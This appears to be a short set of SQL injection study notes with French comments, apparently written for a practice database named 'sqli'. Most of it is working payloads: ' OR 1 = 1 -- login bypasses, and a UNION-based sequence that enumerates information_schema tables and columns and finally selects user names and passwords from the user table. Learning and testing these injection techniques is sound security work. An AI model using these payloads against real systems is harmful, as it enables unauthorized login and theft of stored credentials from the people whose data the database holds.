

SELECT ? FROM ? WHERE ? LIKE '%S%';

SELECT ? FROM ? WHERE ? LIKE '%' -- %';



SELECT ? FROM ? WHERE ? = 'username' AND ? = 'password'

SELECT ? FROM ? WHERE ? = '' OR 1 = 1 -- ' AND ? = 'password'
SELECT ? FROM ? WHERE ? = '' OR id = '1' -- ' AND ? = 'password'


-- Pour extraire des informations
-- Utilisation du mot clé UNION
SELECT ? FROM ? WHERE ? LIKE '%' UNION (SELECT 1, 2, 3 FROM information_schema.tables)   -- '%'

' UNION (SELECT 1, 2, 3 FROM information_schema.tables) -- 
' UNION (SELECT 1, table_schema, 3 FROM information_schema.tables) -- 
' UNION (SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema = 'sqli') -- 
' UNION (SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name = 'user' AND table_schema = 'sqli') -- 
' UNION (SELECT usr_id, usr_name, usr_password FROM user) -- 


